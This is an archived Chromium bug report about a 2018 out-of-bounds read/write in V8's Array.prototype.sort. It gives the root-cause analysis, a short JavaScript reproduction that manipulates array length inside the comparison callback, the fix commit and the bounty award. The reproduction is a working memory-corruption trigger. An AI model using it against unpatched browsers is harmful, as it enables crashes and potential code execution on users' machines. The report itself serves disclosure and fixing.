# Security: OOB read/write in Array.prototype.sort

| Field | Value |
|-------|-------|
| **Issue ID** | [40091646](https://issues.chromium.org/issues/40091646) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | se...@gmail.com |
| **Assignee** | sz...@google.com |
| **Created** | 2018-06-13 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

<https://cs.chromium.org/chromium/src/v8/src/builtins/array.tq?rcl=6a21b5f98ec12d8e96e64f74f9ffb60a6fded7ce&l=578>  

macro CanUseSameAccessor<ElementsAccessor : type>(  

context: Context, receiver: Object, initialReceiverMap: Object,  

initialReceiverLength: Number): bool {  

assert(IsJSArray(unsafe\_cast<HeapObject>(receiver)));

let a: JSArray = unsafe\_cast<JSArray>(receiver);  

if (a.map != initialReceiverMap) return false;

let originalLength: Smi = unsafe\_cast<Smi>(initialReceiverLength);  

if (a.length\_fast != originalLength) return false;

return true;  

}

Array.prototype.sort has been recently reimplemented using Torque. |CanUseSameAccessor()| determines whether the  

algorithm should fall back to the slow path after performing actions that are observable by JavaScript. It  

currently doesn't ensure that the elements store of the array hasn't been replaced. A JS function passed to  

|sort()| can do the following:

- update the length of the array forcing the store to be shrunk
- attach a new elements store to the array
- set the length to the original value

In this case, |sort()| might access OOB data because it uses the initial (shrunk) elements for load/store operations.

**VERSION**  

Google Chrome 69.0.3452.0 (Official Build) dev (64-bit) (cohort: Dev)  

Google Chrome 69.0.3457.0 (Official Build) canary (64-bit) (cohort: Clang-64)

**REPRODUCTION CASE**

<script>
ARRAY\_LEN = 1024 \\* 1024;
array = [];
for (let i = 1; i < ARRAY\_LEN; ++i) {
array[i] = i + 0.1;
}
let executed = false;
compareFn = \_ => {
if (!executed) {
executed = true;
array.length = 1; // shrink
array.length = 0; // replace
array.length = ARRAY\_LEN; // restore the original length
}
}
array.sort(compareFn);
location.reload();
</script>

## Attachments

- [sort-asan.log](attachments/sort-asan.log) (text/plain, 1.0 KB)
- [poc.html](attachments/poc.html) (text/plain, 7.6 KB)

## Timeline

### wf...@chromium.org (2018-06-14)

Thanks for the report.

Triaging as per https://github.com/v8/v8/wiki/Triaging-issues

[Monorail components: Blink>JavaScript]

### wf...@chromium.org (2018-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-06-15)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-06-15)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@chromium.org (2018-06-15)

[Empty comment from Monorail migration]

### jg...@chromium.org (2018-06-18)

[Empty comment from Monorail migration]

### ms...@chromium.org (2018-06-18)

[Empty comment from Monorail migration]

### se...@gmail.com (2018-06-18)

I've attached a proof-of-concept for the latest Canary build to demonstrate the bug is exploitable.

Google Chrome 69.0.3464.0 (Official Build) canary (64-bit)
Windows 10.0.17134.112

### bu...@chromium.org (2018-06-19)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/ce3c0064cd55ed4b7c8065971a6f1a291d29f5e4

commit ce3c0064cd55ed4b7c8065971a6f1a291d29f5e4
Author: Simon Zünd <szuend@google.com>
Date: Tue Jun 19 05:19:44 2018

[array] Fix OOB load/stores when underlying FixedArray changed

This CL fixes a bug that allowed OOB read/stores on fastpaths when
a comparison function caused the underlying FixedArray to change
while keeping the elements kinds and size property on the original
JSArray the same.

R=jgruber@chromium.org

Bug: chromium:852592
Change-Id: I09af357d10e7f41e75241e4c87430fc9aa806f8c
Reviewed-on: https://chromium-review.googlesource.com/1104158
Commit-Queue: Simon Zünd <szuend@google.com>
Reviewed-by: Jakob Gruber <jgruber@chromium.org>
Reviewed-by: Camillo Bruni <cbruni@chromium.org>
Cr-Commit-Position: refs/heads/master@{#53811}
[modify] https://crrev.com/ce3c0064cd55ed4b7c8065971a6f1a291d29f5e4/src/builtins/array-sort.tq
[add] https://crrev.com/ce3c0064cd55ed4b7c8065971a6f1a291d29f5e4/test/mjsunit/regress/regress-crbug-852592.js


### sz...@google.com (2018-06-19)

[Empty comment from Monorail migration]

### ms...@chromium.org (2018-06-19)

[Empty comment from Monorail migration]

### jg...@chromium.org (2018-06-19)

See also: 

This CL ensures we execute CSA_SLOW_ASSERTs on the bots:
https://crrev.com/c/1105050

And here we turn FixedArray OOB assertions into standard CSA_ASSERTs:
https://crrev.com/c/1103568

With these CLs, the the fuzzers have a good chance of catching bugs like this.

### sh...@chromium.org (2018-06-19)

[Empty comment from Monorail migration]

### ha...@chromium.org (2018-06-20)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-06-26)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-06-29)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@chromium.org (2018-06-29)

$7,500 for this one - thanks as ever :-)

### aw...@chromium.org (2018-06-29)

[Empty comment from Monorail migration]

### aw...@google.com (2018-08-16)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-09-25)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-05)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-05)

This issue was migrated from crbug.com/chromium/852592?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40091646)*
